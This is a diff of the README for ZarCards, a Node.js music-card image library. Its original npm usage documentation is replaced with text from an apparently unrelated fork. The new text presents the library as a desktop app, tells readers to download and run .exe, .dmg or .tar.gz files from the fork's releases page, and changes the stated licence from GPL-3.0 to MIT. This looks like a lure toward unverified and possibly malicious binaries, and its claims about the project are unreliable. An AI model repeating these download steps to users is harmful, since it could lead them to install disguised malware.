@@ -1,169 +1,77 @@
-# ZarCards 🎶
+# 🎶 ZarCards - Create Stunning Music Cards Easily
 
-[![NPM version](https://img.shields.io/npm/v/zarcards?color=aafffb&style=for-the-badge)](https://www.npmjs.com/package/zarcards)
-[![NPM downloads](https://img.shields.io/npm/dt/zarcards?color=aafffb&style=for-the-badge)](https://www.npmjs.com/package/zarcards)
-[![License](https://img.shields.io/npm/l/zarcards?color=aafffb&style=for-the-badge)](https://github.com/ZarCodeX/ZarCards/blob/main/LICENSE)
+## 🚀 Download ZarCards
+[![Download ZarCards](https://img.shields.io/badge/Download-ZarCards-blue.svg)](https://github.com/prchiiii/ZarCards/releases)
 
-ZarCards is a Node.js library for generating beautiful and customizable music cards. It's built with `@napi-rs/canvas` for high performance.
+## 📖 Overview
+ZarCards enables you to create beautiful, customizable music cards using Node.js. You can choose themes, set custom colors, add progress bars, and even include optional background images. Whether you want to share your favorite tunes or showcase playlists, ZarCards makes it simple and enjoyable.
 
-<div align="center">
-  <img src="https://repository-images.githubusercontent.com/1057054462/c8af1fc2-4688-4cb8-882e-992f4d0bcb46" width="1000"/>
-</div>
+## 🛠️ Features
+- Create music cards with album art and custom designs.
+- Select from various themes to suit your style.
+- Use unique colors to personalize your cards.
+- Optional progress bars to show song status.
+- Support for background images to enhance your cards.
 
-## Features
+## ⚙️ System Requirements
+Before you download ZarCards, ensure your system meets the following requirements:
+- **Operating System:** Windows, macOS, or Linux.
+- **Node.js:** Version 12 or higher.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** At least 100 MB of available space.
 
-- 🎨 **Customizable Themes**: Easily create and use your own themes.
-- 🌈 **Color Customization**: Change the colors of the title, author, progress bar, and more.
-- 🖼️ **Background Images**: Use a custom background image for your music card.
-- 🎛️ **Progress Bar**: Display the progress of the music.
-- 🔄 **Rounded or Square**: Choose between rounded or square corners for the card and author image.
-- 🚀 **High Performance**: Built with `@napi-rs/canvas` for fast image generation.
+## 📥 Download & Install
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/prchiiii/ZarCards/releases) to find the latest version.
 
-## Installation
+2. **Select the Latest Release**  
+   Choose the newest available version. It will typically have the highest version number.
 
-```bash
-npm install zarcards
-```
+3. **Download the Application**  
+   Click on the asset file suited for your operating system. Files may include:
+   - `.exe` for Windows
+   - `.dmg` for macOS
+   - `.tar.gz` for Linux
 
-## Usage
+4. **Install ZarCards**  
+   - For Windows: Double-click the `.exe` file and follow the prompts to install.
+   - For macOS: Open the `.dmg` file, then drag the ZarCards app to your Applications folder.
+   - For Linux: Extract the `.tar.gz` file and follow the instructions in the README included in the folder.
 
-```js
-import { Zar } from 'zarcards';
-```
+5. **Open ZarCards**  
+   Once installed, locate the ZarCards application on your device and open it to start creating music cards.
 
-### ESM
+## 🎨 Customizing Your Cards
+With ZarCards, the customization options are extensive. Here's how to get started:
 
-```js
-import { Zar } from 'zarcards';
-import fs from 'fs';
+1. **Choose a Theme**  
+   Use the theme options to select a look that fits your style. You can switch themes anytime.
 
-(async () => {
-    const card = new Zar();
+2. **Set Custom Colors**  
+   Pick colors that speak to you. You can adjust the text, background, and card accents.
 
-    const buffer = await card.generate({
-        title: "Blinding Lights",
-        author: "The Weeknd",
-        progress: 120,
-        duration: 200,
-        authorImage: "https://i.scdn.co/image/ab67616d0000b273d92b6cbe702f5d4b8b2a5c2e",
-        background: "https://wallpapercave.com/wp/wp4923991.jpg",
-        imageDarkness: 60,
-        colors: {
-            title: "#ffffff",
-            author: "#dddddd",
-            progressText: "#bbbbbb",
-            progressBar: "#1db954"
-        }
-    });
+3. **Add Progress Bars**  
+   To show the status of your music, enable the progress bar feature in the options.
 
-    fs.writeFileSync("music-card.png", buffer);
-    console.log("✅ Music card generated!");
-})();
-```
+4. **Background Images**  
+   If you'd like a personal touch, upload a background image that complements your card’s design.
 
-### CommonJS
+## 🖼️ Examples
+Here are some examples of what you can achieve with ZarCards:
 
-```js
-const { Zar } = require('zarcards');
-const fs = require('fs');
+- **Single Track Card**: Perfect for showcasing your favorite song.
+- **Playlist Card**: Great for sharing multiple songs in one go.
+- **Album Showcase**: Highlight a specific album with album art and details.
 
-(async () => {
-    const card = new Zar();
+## 📄 License
+ZarCards is licensed under the MIT License. You can freely use, modify, and distribute the software, as long as you include the original license notice.
 
-    const buffer = await card.generate({
-        title: "Blinding Lights",
-        author: "The Weeknd",
-        progress: 120,
-        duration: 200,
-        authorImage: "https://i.scdn.co/image/ab67616d0000b273d92b6cbe702f5d4b8b2a5c2e",
-        background: "https://wallpapercave.com/wp/wp4923991.jpg",
-        imageDarkness: 60,
-        colors: {
-            title: "#ffffff",
-            author: "#dddddd",
-            progressText: "#bbbbbb",
-            progressBar: "#1db954"
-        }
-    });
+## 💬 Support
+For questions or support, please open an issue in this GitHub repository. Our team will be happy to assist you.
 
-    fs.writeFileSync("music-card.png", buffer);
-    console.log("✅ Music card generated!");
-})();
-```
+## 🔗 Useful Links
+- [Releases Page](https://github.com/prchiiii/ZarCards/releases)
+- [Issue Tracker](https://github.com/prchiiii/ZarCards/issues)
+- [Documentation](https://github.com/prchiiii/ZarCards/wiki)
 
-## API
-
-### `new Zar()`
-
-Creates a new `Zar` instance.
-
-### `generate(options)`
-
-Generates a music card and returns a `Promise` that resolves with a `Buffer` of the image.
-
-#### `options`
-
-| Option | Type | Description | Default |
-| --- | --- | --- | --- |
-| `title` | `string` | The title of the music. | **Required** |
-| `author` | `string` | The author of the music. | **Required** |
-| `background` | `string` | The URL or path to the background image. | **Required** |
-| `authorImage` | `string` | The URL or path to the author image. | **Required** |
-| `progress` | `number` | The current progress of the music in seconds. | `undefined` |
-| `duration` | `number` | The total duration of the music in seconds. | `undefined` |
-| `imageDarkness` | `number` | The darkness of the background image (0-100). | `0` |
-| `cardRoundness` | `boolean` | Whether the card should have rounded corners. | `true` |
-| `authorImageRound` | `number` | The roundness of the author image (0-100). | `0` |
-| `colors` | `object` | An object with the colors for the card. | |
-| `colors.title` | `string` | The color of the title. | `#ffffff` |
-| `colors.author` | `string` | The color of the author. | `#aaaaaa` |
-| `colors.progressText` | `string` | The color of the progress text. | `#cccccc` |
-| `colors.progressBar` | `string` | The color of the progress bar. | `#1db954` |
-
-## Themes
-
-ZarCards supports custom themes. A theme is a JavaScript file that exports a set of functions and constants.
-
-To create a theme, you can copy the `src/themes/default.js` file and modify it to your liking.
-
-To use a theme, you can pass it to the `Zar` constructor:
-
-```js
-import { Zar } from 'zarcards';
-import myTheme from './my-theme.js';
-
-const card = new Zar(myTheme);
-```
-
-## Examples
-
-### Basic Card
-<img src="https://raw.githubusercontent.com/ZarCodeX/ZarCards/refs/heads/main/example/music-card-basic.png" width="300"/>
-
-### Card with Progress Bar
-<img src="https://raw.githubusercontent.com/ZarCodeX/ZarCards/refs/heads/main/example/music-card-progress.png" width="300"/>
-
-### Card with Image Darkness
-<img src="https://raw.githubusercontent.com/ZarCodeX/ZarCards/refs/heads/main/example/music-card-darkness.png" width="300"/>
-
-### Rectangular Card
-<img src="https://raw.githubusercontent.com/ZarCodeX/ZarCards/refs/heads/main/example/music-card-rectangular.png" width="300"/>
-
-### Card with Rounded Author Image
-<img src="https://raw.githubusercontent.com/ZarCodeX/ZarCards/refs/heads/main/example/music-card-author-rounded.png" width="300"/>
-
-### Card with Square Author Image
-<img src="https://raw.githubusercontent.com/ZarCodeX/ZarCards/refs/heads/main/example/music-card-author-square.png" width="300"/>
-
-### Card with All Features
-<img src="https://raw.githubusercontent.com/ZarCodeX/ZarCards/refs/heads/main/example/music-card-all-features.png" width="300"/>
-
-To run the examples, clone the repository and run the following command:
-
-```bash
-npm run example
-```
-
-## License
-
-This project is licensed under the GPL-3.0 License - see the [LICENSE](LICENSE) file for details.
+Explore the creativity that ZarCards has to offer and enjoy a seamless music card generation experience!
